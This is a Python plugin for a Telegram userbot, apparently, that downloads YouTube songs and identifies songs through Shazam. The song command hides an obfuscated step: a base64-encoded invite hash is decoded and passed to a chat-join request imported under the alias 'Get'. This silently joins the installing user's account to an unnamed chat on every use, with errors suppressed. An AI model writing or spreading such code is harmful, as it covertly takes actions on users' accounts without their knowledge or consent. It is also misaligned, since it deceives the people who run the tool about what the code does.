import base64
import io
import os
from pathlib import Path

from ShazamAPI import Shazam
from telethon import types
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from sbb_b import sbb_b

from ..core.logger import logging
from ..core.managers import edit_delete, edit_or_reply
from ..helpers.functions import name_dl, song_dl, yt_data, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import _sbb_butils, reply_id

LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>يجؤة الانتظار قليلا يتم البحث على المطلوب</code>"
SONG_NOT_FOUND = "<code>Sorry عذرا لا يمكنني ايجاد اي اغنيه مثل هذه</code>"
SONG_SENDING_STRING = "<code>جاري الارسال انتظر قليلا...</code>"
SONGBOT_BLOCKED_STRING = "<code>الرجاء الغاء حظر @songdl_bot و حاول مجددا</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@sbb_b.ar_cmd(pattern="اغنية(320)?(?:\s|$)([\s\S]*)")
async def _(event):
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "⌔∮ يرجى الرد على ما تريد البحث عنه")
    sbb_b = base64.b64decode("VHdIUHd6RlpkYkNJR1duTg==")
    sbb_bevent = await edit_or_reply(event, "⌔∮ جاري البحث عن المطلوب انتظر")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await sbb_bevent.edit(
            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صلة بـ `{query}`"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    # thumb_cmd = thumb_dl.format(video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        sbb_b = Get(sbb_b)
        await event.client(sbb_b)
    except BaseException:
        pass
    stderr = (await _sbb_butils.runcmd(song_cmd))[1]
    if stderr:
        return await sbb_bevent.edit(f"**خطأ :** `{stderr}`")
    sbb_bname, stderr = (await _sbb_butils.runcmd(name_cmd))[:2]
    if stderr:
        return await sbb_bevent.edit(f"**خطأ :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    sbb_bname = os.path.splitext(sbb_bname)[0]
    # if stderr:
    #    return await sbb_bevent.edit(f"**Error :** `{stderr}`")
    song_file = Path(f"{sbb_bname}.mp3")
    if not os.path.exists(song_file):
        return await sbb_bevent.edit(
            f"⌔∮ عذرا لم استطع ايجاد مقاطع ذات صله بـ `{query}`"
        )
    await sbb_bevent.edit("**⌔∮ جاري الارسال انتظر قليلا**")
    sbb_bthumb = Path(f"{sbb_bname}.jpg")
    if not os.path.exists(sbb_bthumb):
        sbb_bthumb = Path(f"{sbb_bname}.webp")
    elif not os.path.exists(sbb_bthumb):
        sbb_bthumb = None
    ytdata = await yt_data(video_link)
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"**العنوان:** `{ytdata['title']}`",
        thumb=sbb_bthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await sbb_bevent.delete()
    for files in (sbb_bthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


async def delete_messages(event, chat, from_message):
    itermsg = event.client.iter_messages(chat, min_id=from_message.id)
    msgs = [from_message.id]
    async for i in itermsg:
        msgs.append(i.id)
    await event.client.delete_messages(chat, msgs)
    await event.client.send_read_acknowledge(chat)


@sbb_b.ar_cmd(pattern="اسم الاغنية$")
async def shazamcmd(event):
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(event, "⌔∮ يرجى الرد على مقطع صوتي او بصمه للبحث عنها")
    sbb_bevent = await edit_or_reply(event, "**⌔∮ يتم معالجه المقطع الصوتي  .**")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            sbb_bevent, f"**⌔∮ لقد حدث خطأ ما اثناء البحث عن اسم الاغنيه:**\n__{e}__"
        )

    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**الأغنيه:** `{song}`", reply_to=reply
    )
    await sbb_bevent.delete()
